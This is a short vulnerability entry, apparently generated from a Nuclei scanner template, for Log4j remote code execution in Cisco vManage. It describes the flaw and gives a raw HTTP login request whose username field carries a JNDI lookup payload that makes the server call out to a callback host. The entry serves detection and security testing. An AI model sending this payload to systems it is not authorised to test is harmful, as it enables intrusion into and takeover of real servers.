# Vulnerability: Cisco vManage (Log4j) - Remote Code Execution
**Classification:** CWE-77,CWE-502
**Source:** Nuclei Template (`cisco-vmanage-log4j-rce.yaml`)

## Description
Cisco vManage is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials. More information is available in the cisco-sa-apache-log4j-qRuKNEbd advisory.

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout: 20s
POST /j_security_check HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Origin: {{BaseURL}}
Referer: {{BaseURL}}

j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&j_password=admin&submit=Log+In
```

